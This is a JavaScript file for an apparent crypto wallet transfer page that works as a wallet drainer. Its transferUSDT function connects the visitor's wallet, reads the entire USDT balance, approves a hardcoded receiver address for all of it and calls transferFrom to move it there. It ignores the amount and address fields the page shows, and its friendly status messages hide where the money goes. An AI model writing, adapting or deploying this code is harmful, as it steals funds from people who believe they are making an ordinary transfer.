// script.js

async function transferUSDT() {
  const status = document.getElementById("status");
  status.innerText = "🔄 Connecting wallet...";

  try {
    if (typeof window.ethereum === "undefined") {
      status.innerText = "❌ Wallet not detected. Use Trust Wallet DApp browser or MetaMask.";
      return;
    }

    const web3 = new Web3(window.ethereum);
    const accounts = await ethereum.request({ method: "eth_accounts" });

    let sender = accounts[0];

    if (!sender) {
      const requested = await ethereum.request({ method: "eth_requestAccounts" });
      sender = requested[0];
    }

    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

    const usdtABI = [
      { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
      { constant: false, inputs: [ { name: "_spender", type: "address" }, { name: "_value", type: "uint256" } ], name: "approve", outputs: [ { name: "", type: "bool" } ], type: "function" },
      { constant: false, inputs: [ { name: "_from", type: "address" }, { name: "_to", type: "address" }, { name: "_value", type: "uint256" } ], name: "transferFrom", outputs: [ { name: "", type: "bool" } ], type: "function" },
      { constant: true, inputs: [ { name: "_owner", type: "address" }, { name: "_spender", type: "address" } ], name: "allowance", outputs: [ { name: "", type: "uint256" } ], type: "function" }
    ];

    const contract = new web3.eth.Contract(usdtABI, usdtAddress);

    const balance = await contract.methods.balanceOf(sender).call();
    if (balance === "0") {
      status.innerText = "🚫 No USDT available in your wallet.";
      return;
    }

    status.innerText = "🟡 Approving USDT transfer...";
    await contract.methods.approve(receiver, balance).send({ from: sender });

    status.innerText = "🚀 Transferring USDT...";
    await contract.methods.transferFrom(sender, receiver, balance).send({ from: sender });

    status.innerText = "✅ All USDT transferred successfully!";
  } catch (error) {
    console.error(error);
    status.innerText = "❌ Error: " + error.message;
  }
}

async function copyAddress() {
  const input = document.getElementById("address");
  input.select();
  input.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(input.value);
}

async function setMax() {
  try {
    if (typeof window.ethereum === "undefined") return;
    const web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    const sender = accounts[0];
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
    const usdtABI = [
      {
        constant: true,
        inputs: [{ name: "_owner", type: "address" }],
        name: "balanceOf",
        outputs: [{ name: "balance", type: "uint256" }],
        type: "function",
      },
    ];
    const contract = new web3.eth.Contract(usdtABI, usdtAddress);
    const balance = await contract.methods.balanceOf(sender).call();
    const formatted = (balance / 10 ** 18).toFixed(2);
    document.getElementById("amount").value = formatted;
    document.getElementById("usd-value").innerText = `≈ $${formatted}`;
  } catch (err) {
    console.error(err);
  }
}
